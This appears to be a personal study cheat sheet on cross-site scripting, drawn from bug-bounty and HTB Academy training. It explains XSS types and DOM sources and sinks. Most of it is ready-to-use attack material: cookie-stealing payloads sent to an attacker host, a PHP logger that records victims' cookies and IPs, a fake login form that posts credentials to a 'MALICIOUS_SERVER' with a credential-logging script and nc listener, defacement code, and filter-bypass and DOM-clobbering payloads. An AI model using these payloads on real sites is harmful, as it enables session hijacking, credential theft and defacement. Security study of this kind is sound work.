# Xss

# THEORY
## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Types
#### Stored (Persistent) 
XSS 	The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)

#### Reflected (Non-Persistent) XSS 	
Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)


#### DOM-based XSS 	Another Non-Persistent 
XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)


## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Source & Sink

To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the Source and Sink of the object displayed on the page. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.

On the other hand, the Sink is the function that writes the user input to a DOM Object on the page. 
The source is the property that is read from the DOM:
```
document.URL
document.documentURI
location
location.href
location.search
location.hash

document.referrer

window.name
```
Sinks, on the other hand are the points in the flow of data at which the untrusted input gets outputted on the page or executed by JavaScript within the page.
```
eval
setTimeout
setInterval

document.write
document.writeIn

innerHTML
outerHTML

window.location
document.location
location.href

jQuery library functions that write to DOM objects are:
    add()
    after()
    append() 
```
------------------------------------------
# BASICS


## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> DOM XSS
- paper: http://www.webappsec.org/projects/articles/071105.shtml
#### xample of DOM-based XSS
```html
<html>
<head><title>DOMXSS</title></head>
</body>
Select your language:
<select><script>
document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"</OPTION>");
document.write("<OPTION value=2>English</OPTION>");
</script></select>
</body>
</html>
```
Attack:
```url
http://www.example.com/dom-xss?default=<script>alert("DOM XSS");</script>
```
#### How to use it:
- you need to share with the victim the url containing the xss. 

#### Isuses:
If you send the xss in the example1, the backend could detect and block/sanitize the request. In the example 2, notice the number sign (#) right after the file name. It tells the browser that everything beyond it is a fragment.
#### Example 1:
```
  http://www.vulnerable.site/welcome.html?notname=
  <script>alert(document.cookie)<script>&name=Joe
```
#### Example 2:
```
/attachment.cgi?id=&action=
  foobar#<script>alert(document.cookie)</script>
  ```
This # fragment has another neat trick I have learned from [this](https://youtu.be/Wbovgw3Qxxc?t=840) streamer
```
attachment.cgi?id=&%09onmouseover=alert(document.location.hash.substring(1))#document.cookie
```

For example, this will trigger a xss on error, which will occur because src is empty. 
```
<img src="" onerror=alert(window.origin)>
```
```
 <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
 src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&
 auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
 ```
## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> BLIND XSS
If we get a request for /username, then we know that the username field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request. 
```
<script src="http://OUR_IP/username"></script>
```
For this reason we need a backend server to receive the request
```
@htb[/htb]$ mkdir /tmp/tmpserver
@htb[/htb]$ cd /tmp/tmpserver
@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```
## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Session Hijiacking
Session Hijiacking is just an xss attack that target the cookies to steal the session.

Typical payload for stealing cookies saved in a file ```script.js```
```js
document.location='http://OUR_IP/index.php?c='+document.cookie;
OR 
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
A small backend server to receive cookies and IP saved in a file ```index.php```
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
Payload
```js
<script src=http://OUR_IP/script.js></script>
```

------------------------------------------
# EXTRAS

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80"> Discovery Xss
#### Automated
- Nessus, Burp Pro, or ZAP,  XSS Strike, Brute XSS, and XSSer
- XSStrike is a Cross Site Scripting detection suite equipped with four hand written parsers, an intelligent payload generator, a powerful fuzzing engine and an incredibly fast crawler.

Instead of injecting payloads and checking it works like all the other tools do, XSStrike analyses the response with multiple parsers and then crafts payloads that are guaranteed to work by context analysis integrated with a fuzzing engine
```bash 
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Xss bypass
### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> innerHTML 
The innerHTML function does not allow the use of the <script> tags within it as a security feature
```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```
As alternative it can be used something like
```javascript
<img src="" onerror=alert(window.origin)>
```
```
### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> Malformed tags
```js
<<a|ascript>alert('xss')</script>
```

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Defacing website

```js
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```
## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Tags bruteforcing
- [How to search for XSS (with blacklisted HTML tags)](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
- [portswigger/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

#### steps 
Searching for allowed tags to be inserted in the search field as parameter
1. 'insertpayloadhere' in the field
2. intercept with burp and send to intruder
3. add the tag list to the payload in the intruder settings
4. brute force and look for the 200, we're looking for a tag which allow to have <script> </script>
5. once the tag has been found you need to search for the event eg:onbegin
6. in the search field we will use url encoding: 
```
%3C -> < 
%3E -> >
%20 -> space
%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%28%22xss%22%29%3E
```

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Waf bypass with anchor
- [Two solutions for the January 2021 Initigriti XSS Challenge](https://www.youtube.com/watch?v=Wbovgw3Qxxc)
```
onmouseover=alert(document.location.has.substring(1))#payloadhere
```
## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80">  Stealing username and password with reflected xss
- find a vulnerable page to xss
- inject the following code as payload
```
document.write('<h3>Please login to continue</h3><form action=http://MALICIOUS_SERVER><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
The page will render something like:
```javascript
<img src="document.write(" <h3=""> Please login to continue</h3><form action=http://MALICIOUS_SERVER><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>);'>
```
- add ```document.getElementById('urlform').remove();``` to remove some elements to force the person to login. 
- send the malicious link and let the server to send back to your malicious server the credentials 
#### Malicious listening server:
```bash
sudo nc -lvnp 80
```
Alternatively, 
Use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
```bash
@htb[/htb]$ mkdir /tmp/tmpserver
@htb[/htb]$ cd /tmp/tmpserver
@htb[/htb]$ vi index.php #at this step we wrote our index.php file
@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80">  Exploiting DOM clobbering to enable XSS
- [Two solutions for the January 2021 Initigriti XSS Challenge]([https://www.youtube.com/watch?v=Wbovgw3Qxxc](https://youtu.be/Wbovgw3Qxxc?t=912))
- [portswigger/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [portswigger/dom-based/Advanced-dom-clobbering](https://portswigger.net/research/dom-clobbering-strikes-back)
- [HTMLCollection](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection)

#### Clobbering definition:
To strike violently and repeatedly; batter or maul. But, In software engineering and Computer science, clobbering a file, Processor register or regions of computer memory is the process of overwriting its contents completely. 

#### Explanation:
~~DOM clobbering is a technique to escalate HTML injection to XSS which has a high impact  DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.~~
DOM Clobbering use the HTMLCollection vulnerability which allow you to add to the HTMLCollection a malicious item with the same id. 
#### Steps:
1. find a form where you can submit some html
2. check in the javascript if there is a ```window.element || something here``` 
3. bypass the sanitization with double anchortag
  - ```<a id=defaultAvatar><<a id=defaultAvatar name=avatar href='cid:"onerror=alert(1)//)"'>```
  - ```<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>```

## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Videos:
- xss API [video](https://youtu.be/xH8WbuApFXw?t=2358)
  - filtering and sanitazation come frontend back end.
  - Always test that frontend and backend are sanitized.
  - eg: registering an account by API with email.
- [w3schools.com/xml](https://www.w3schools.com/xml/xml_dtd.asp)
- [XXE Lab Breakdown: Exploiting XXE using external entities to retrieve files](https://www.youtube.com/watch?v=71dZaGfOVqw)
- [How to search for XXE!](https://www.youtube.com/watch?v=0DQnWalxYb4)
- [Web App Testing: Episode 3 - XSS, SQL Injection, and Broken Access Control](https://www.youtube.com/watch?v=azYwfI26oXo&list=PLLKT__MCUeixCoi2jtP2Jj8nZzM4MOzBL&index=3)
- [🚀 Cross Site Scripting ( XSS ) Vulnerability Payload List 🚀](https://github.com/payloadbox/xss-payload-list)


 
